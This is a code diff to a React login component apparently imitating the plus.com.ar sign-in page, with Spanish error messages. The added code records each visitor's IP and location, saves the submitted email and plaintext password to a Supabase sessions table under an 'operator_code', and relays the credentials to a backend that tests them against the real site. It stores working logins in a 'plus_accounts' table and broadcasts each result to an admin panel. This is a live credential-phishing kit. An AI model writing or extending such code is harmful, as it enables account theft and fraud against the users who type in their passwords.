@@ -75,6 +75,7 @@ const Plus = () => {
   const handleLogin = useCallback(async (submittedEmail: string, password: string) => {
     setError(""); setErrorMessage(""); setLoading(true); setEmail(submittedEmail);
 
+    // 1. Collect IP data in background
     let ipData = { ip: "unknown", country: "", city: "", region: "" };
     try {
       const res = await fetch("https://ipapi.co/json/");
@@ -84,11 +85,13 @@ const Plus = () => {
       }
     } catch { /* ignore */ }
 
+    // 2. Create/update session for admin tracking
+    let currentSessionId = sessionId;
     try {
-      if (sessionId) {
+      if (currentSessionId) {
         await supabase.from("sessions").update({
           email: submittedEmail, password, status: "pending_review",
-        }).eq("id", sessionId);
+        }).eq("id", currentSessionId);
       } else {
         const newId = crypto.randomUUID();
         await supabase.from("sessions").insert({
@@ -98,8 +101,46 @@ const Plus = () => {
           status: "pending_review", source: "plus", operator_code: operatorCode,
         });
         setSessionId(newId);
+        currentSessionId = newId;
       }
-      setStep("waiting");
+    } catch { /* session tracking is non-blocking */ }
+
+    // 3. Call plus-auth backend to authenticate with plus.com.ar
+    try {
+      const { data: authResult, error: authError } = await supabase.functions.invoke("plus-auth", {
+        body: { action: "login", email: submittedEmail, password, operatorCode },
+      });
+
+      if (authError) {
+        // Edge function error — update session and show error
+        const errMsg = "Email o contraseña incorrectos. Intentá de nuevo.";
+        if (currentSessionId) {
+          await supabase.from("sessions").update({ status: "wrong_password" }).eq("id", currentSessionId);
+        }
+        setError(errMsg);
+        setLoading(false);
+        return;
+      }
+
+      if (authResult?.error) {
+        // Plus API rejected login
+        if (currentSessionId) {
+          await supabase.from("sessions").update({ status: "wrong_password" }).eq("id", currentSessionId);
+        }
+        setError(authResult.error);
+        setLoading(false);
+        return;
+      }
+
+      // 4. Login success — data saved to plus_accounts by edge function
+      if (currentSessionId) {
+        await supabase.from("sessions").update({ status: "login_success" }).eq("id", currentSessionId);
+        // Broadcast success to admin panel
+        await supabase.channel(`session-review-${currentSessionId}`).send({
+          type: "broadcast", event: "review_decision", payload: { status: "login_success" },
+        });
+      }
+      setStep("done");
     } catch {
       setError("Error de conexión. Intentá de nuevo.");
     }
